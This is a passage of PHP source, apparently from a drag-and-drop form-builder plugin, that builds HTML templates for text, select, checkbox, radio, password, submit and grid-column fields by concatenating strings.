//////////MD TEXT INPUT
								$output .= '<div class="field form_field md-field md-text text">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-minus"></i>&nbsp;&nbsp;<span class="field_title">Text Field</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12 input_container" id="field_container">';
															$output .= '
																<span class="input md-wrapper input--jiro">
																	<input class="md-input input__field input__field--jiro error_message the_input_element text" type="text" id="input-6" name="text_field" data-default-value=""  data-placement="bottom" data-content="Please enter a value" data-secondary-message="" title="" />
																	<label class="md-label input__label input__label--jiro" for="input-6">
																		<span class="md-label-content input__label-content input__label-content--jiro"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label">MD Text Field</span></span>
																	</label>
																</span>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
														
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';	
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//////////MD SELECT
								$output .= '<div class="field form_field md-field md-select text">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="glyphicon glyphicon-arrow-down"></i>&nbsp;&nbsp;<span class="field_title">Select</span></div>';
									$output .= '</div>';
								$output .= '<div id="form_object" class="form_object" style="display:none;">';
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Select</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																		$output .= '<select id="cd-dropdown" name="cd-dropdown" class="cd-select the_input_element" data-effect="stack">
																						<option value="0" selected="selected">Choose Option</option>
																						<option value="1" >Option 1</option>
																						<option value="2" >Option 2</option>
																						<option value="3" >Option 3</option>
																					</select>';
																		$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= ' </div>';
								
								
								
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';
					
*/
/****************************************************/	
/**CLASSIC FIELDS ************************************/	
/****************************************************/	
					$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingClassic">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseClassic" aria-expanded="true" aria-controls="collapseClassic">';
									$output .= '<span class="fa fa-heart"></span>&nbsp;Classic Fields';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseClassic" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingClassic">';
							$output .= '<div class="panel-body">';
//////////TEXT FIELD
								$output .= '<div class="field form_field classic-fields classic-text">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-minus"></i>&nbsp;&nbsp;<span class="field_title">Text Field</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Text Field</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																		$output .= '<input id="ve_text" type="text" name="text_field" placeholder="" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" maxlength="200" class="error_message svg_ready the_input_element text pre-format full_width" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" data-secondary-message="" title="">';
																		$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';								
								
//////////TEXT AREA
								$output .= '<div class="field form_field classic-fields classic-textarea">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn  btn-info btn-sm form-control"><i class=" glyphicon glyphicon-align-justify"></i>&nbsp;&nbsp;<span class="field_title">Text Area</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Text Area</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<textarea name="textarea" id="textarea" placeholder="Text Area"  data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message svg_ready the_input_element textarea pre-format full_width" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" title=""></textarea>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
						
								
								
//////////SELECT
								$output .= '<div class="field form_field classic-fields classic-select">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-arrow-down"></i>&nbsp;&nbsp;<span class="field_title">Select</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Select</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<select name="select" data-backgound-color="#FFFFFF" data-text-color="#000000" data-input-size="" data-font-family="" data-bold-text="false" data-italic-text="false" data-text-alignment="left" data-border-color="#CCCCCC" data-required="false" class="the_input_element error_message text pre-format full_width" id="select" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-error-class="alert-default"  data-placement="bottom" data-content="Please select an option" title="">
																					<option value="0" selected="selected">--- Select ---</option>
																					<option>Option 1</option>
																					<option>Option 2</option>
																					<option>Option 3</option>
																				</select>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';							
						
//////////MULTI SELECT
								$output .= '<div class="field form_field classic-fields classic-multi-select">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-sort-by-attributes-alt"></i>&nbsp;&nbsp;<span class="field_title">Multi-Select</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Multi Select</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<select name="multi_select[]" multiple data-backgound-color="#FFFFFF" data-text-color="#000000" data-input-size="" data-font-family="" data-bold-text="false" data-italic-text="false" data-text-alignment="left" data-border-color="#CCCCCC" data-required="false" class="the_input_element error_message text pre-format full_width" id="select" data-onfocus-color="#66AFE9" data-error-class="alert-default" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please select an option" title="">
																					<option value="0" selected="selected">--- Select ---</option>
																					<option>Option 1</option>
																					<option>Option 2</option>
																					<option>Option 3</option>
																				</select>
																			';
																	$output .= '</div>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
								
						
//////////RADIO BUTTONS
							$output .= '<div class="field form_field classic-fields classic-radio-group">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-ok-circle"></i>&nbsp;&nbsp;<span class="field_title">Radio Buttons</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Radio Group</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="Please select one" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="radios-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-0" value="1" >
																			  <span class="input-label radio-label">Radio 1</span>
																			  </span>
																		  </label>
																		  <label class="radio-inline" for="radios-1"  data-svg="demo-input-1">
																			<span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-1" value="2">
																			  <span class="input-label radio-label">Radio 2</span>
																			</span>
																		  </label>
																		  <label class="radio-inline" for="radios-2"  data-svg="demo-input-1">
																			<span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-2" value="3" >
																			  <span class="input-label radio-label">Radio 3</span>
																			</span>
																		  </label>
																			';
																	
																	$output .= '</div>';
																	$output .= '<span class="help-block hidden">Help text...</span>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
													$output .= '</div>';
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
								

						
//////////CHECK BOXES
							$output .= '<div class="field form_field classic-fields classic-check-group">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class=" glyphicon glyphicon-check"></i>&nbsp;&nbsp;<span class="field_title">Check Boxes</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder radio-group no-pre-suffix">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Checbox Group</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container error_message" id="the-radios" data-checked-color="alert-success" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="Please select one" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="checkbox-inline " for="check-1"  data-svg="demo-input-1">
																					  <span class="svg_ready">
																					  <input class="check svg_ready the_input_element" type="checkbox" name="checks[]" id="check-1" value="Check 1" >
																					  <span class="input-label check-label">Check 1</span>
																					  </span>
																				  </label>
																				  <label class="checkbox-inline" for="check-2"  data-svg="demo-input-1">
																					<span class="svg_ready">
																					  <input class="check svg_ready the_input_element" type="checkbox" name="checks[]" id="check-2" value="Check 2">
																					  <span class="input-label check-label">Check 2</span>
																					</span>
																				  </label>
																				  <label class="checkbox-inline" for="check-3"  data-svg="demo-input-1">
																					<span class="svg_ready">
																					  <input class="check svg_ready the_input_element" type="checkbox" name="checks[]" id="check-3" value="Check 3" >
																					  <span class="input-label check-label">Check 3</span>
																					</span>
																				  </label>
																			';
																			$output .= '</div>';	
																	$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											
										$output .= '</div>';	
								$output .= '</div>';
////////////PASSWORD FIELD
								$output .= '<div class="field form_field classic-fields classic-text">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-info btn-sm form-control"><i class="fa fa-key"></i>&nbsp;&nbsp;<span class="field_title">Password Field</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 label_container align_left">';
																	$output .= '<label id="nexf_title" class="nexf_title ve_title"><span class="is_required glyphicon glyphicon-star btn-xs hidden"></span><span class="the_label style_bold">Password</span><br /><small class="sub-text style_italic"></small></label>';
																$output .= '</div>';
																$output .= '<div class="col-sm-12 input_container">';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																		$output .= '<input id="ve_text" type="password" name="text_field" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" maxlength="200" class="error_message svg_ready the_input_element text pre-format full_width" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Please enter a value" data-secondary-message="" title="">';
																		$output .= '<span class="help-block hidden">Help text...</span>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';																
//////////SUBMIT BUTTON						
							$output .= '<div class="field form_field classic-fields classic-submit-button" style="width:33%">';
									$output .= '<div class="draggable_object input-group-sm ">';
										$output .= '<div class="btn btn-warning btn-sm form-control"><i class=" glyphicon glyphicon glyphicon-send"></i>&nbsp;&nbsp;<span class="field_title">Submit Button</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													$output .= '<div class="row ">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12 input_container align_right">';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																		$output .= '<button class="nex-submit the_input_element">Submit</div><br />
																		<small class="svg_ready"><a href="http://codecanyon.net/user/Basix/portfolio?ref=Basix" target="_blank"></a></small>';
																	$output .= '</button>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
														
													
												
												
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
								
							
					
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';

					

/****************************************************/	
/**GRID FIELDS ************************************/	
/****************************************************/	
					$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingGrid">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseGrid" aria-expanded="true" aria-controls="collapseGrid">';
									$output .= '<span class="glyphicon glyphicon-th"></span>&nbsp;Grid System';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseGrid" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingGrid">';
							$output .= '<div class="panel-body">';
							

//PANEL
								$output .= '<div class="field form_field grid other-elements is_panel">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;Panel</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-inner" data-svg="demo-input-1">';
												$output .= '<div class="row">';
													$output .= '<div class="input_holder col-sm-12">';
														$output .= '<div class="panel panel-default ">';
															$output .= '<div class="panel-heading">Panel Heading</div>';
															$output .= '<div class="panel-body the-panel-body">';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
										$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
											
											$output .= '<div class="btn btn-info btn-sm edit"><i class="glyphicon glyphicon-pencil"></i></div>';
											$output .= '<div class="btn btn-danger btn-sm delete"><i class="glyphicon glyphicon-remove"></i></div>';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';

// Well
								/*$output .= '<div class="field form_field grid other-elements is_well">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-primary btn-sm form-control"><i class="fa fa-square-o"></i>&nbsp;&nbsp;Well</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-inner" data-svg="demo-input-1">';
												$output .= '<div class="row">';
													$output .= '<div class="grid_input_holder col-sm-12">';
														$output .= '<div class="panel grid-system grid-system panel-default">';
															$output .= '<div class="panel-body well">';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';*/

// 1 Column
								$output .= '<div class="field form_field grid grid-system grid-system-1">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-primary btn-sm form-control">1 Column</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-inner" data-svg="demo-input-1">';
												$output .= '<div class="row grid_row">';
													$output .= '<div class="grid_input_holder col-sm-12">';
														$output .= '<div class="panel grid-system grid-system panel-default">';
															$output .= '<div class="panel-body">';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//2 Columns
								$output .= '<div class="field form_field grid grid-system grid-system-2">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-primary btn-sm form-control">2 Columns</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
												$output .= '<div class="input-inner" data-svg="demo-input-1">';
													$output .= '<div class="row grid_row">';
														$output .= '<div class="grid_input_holder col-sm-6">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="grid_input_holder col-sm-6">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
//3 Columns								
								$output .= '<div class="field form_field grid grid-system grid-system-3">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-primary btn-sm form-control">3 Columns</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
												$output .= '<div class="input-inner" data-svg="demo-input-1">';
													$output .= '<div class="row  grid_row">';
														$output .= '<div class="grid_input_holder col-sm-4">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="grid_input_holder col-sm-4">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="grid_input_holder col-sm-4">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
//4 Columns								
								$output .= '<div class="field form_field grid grid-system grid-system-4">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-primary btn-sm form-control">4 Columns</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
												$output .= '<div class="input-inner" data-svg="demo-input-1">';
													$output .= '<div class="row grid_row">';
														$output .= '<div class="grid_input_holder col-sm-3">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-3">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-3">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-3">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
//6 Columns								
								$output .= '<div class="field form_field grid grid-system grid-system-6">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-primary btn-sm form-control">6 Columns</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
												$output .= '<div class="input-inner" data-svg="demo-input-1">';
													$output .= '<div class="row grid_row">';
														$output .= '<div class="grid_input_holder col-sm-2">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-2">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-2">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-2">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
